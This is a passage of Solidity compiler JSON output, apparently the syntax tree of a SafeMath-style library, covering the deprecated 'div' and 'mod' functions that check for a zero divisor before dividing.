														"src": "6357:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 462,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6357:28:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 463,
												"nodeType": "ExpressionStatement",
												"src": "6357:28:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 466,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 464,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 448,
														"src": "6402:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 465,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 450,
														"src": "6406:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6402:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 456,
												"id": 467,
												"nodeType": "Return",
												"src": "6395:12:2"
											}
										]
									},
									"documentation": "@dev Returns the integer division of two unsigned integers, reverting with custom message on\ndivision by zero. The result is rounded towards zero.\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {tryDiv}.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero.",
									"id": 469,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 453,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 448,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 469,
												"src": "6265:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 447,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6265:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 450,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 469,
												"src": "6276:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 449,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6276:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 452,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 469,
												"src": "6287:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 451,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6287:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6264:50:2"
									},
									"returnParameters": {
										"id": 456,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 455,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 469,
												"src": "6338:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 454,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6338:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6337:9:2"
									},
									"scope": 493,
									"src": "6252:162:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 491,
										"nodeType": "Block",
										"src": "7155:67:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 483,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 481,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 473,
																"src": "7173:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 482,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7177:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7173:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 484,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 475,
															"src": "7180:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 480,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "7165:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 485,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7165:28:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 486,
												"nodeType": "ExpressionStatement",
												"src": "7165:28:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 489,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 487,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 471,
														"src": "7210:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 488,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 473,
														"src": "7214:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7210:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 479,
												"id": 490,
												"nodeType": "Return",
												"src": "7203:12:2"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nreverting with custom message when dividing by zero.\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\nmessage unnecessarily. For custom revert reasons use {tryMod}.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero.",
									"id": 492,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 476,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 471,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 492,
												"src": "7073:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 470,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7073:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 473,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 492,
												"src": "7084:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 472,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7084:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 475,
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 492,
												"src": "7095:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 474,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7095:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7072:50:2"
									},
									"returnParameters": {
										"id": 479,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 478,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 492,
												"src": "7146:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 477,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7146:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7145:9:2"
									},
									"scope": 493,
									"src": "7060:162:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 494,
							"src": "630:6594:2"
						}
					],
					"src": "33:7192:2"
				},
				"id": 2
			}
		}
	}
}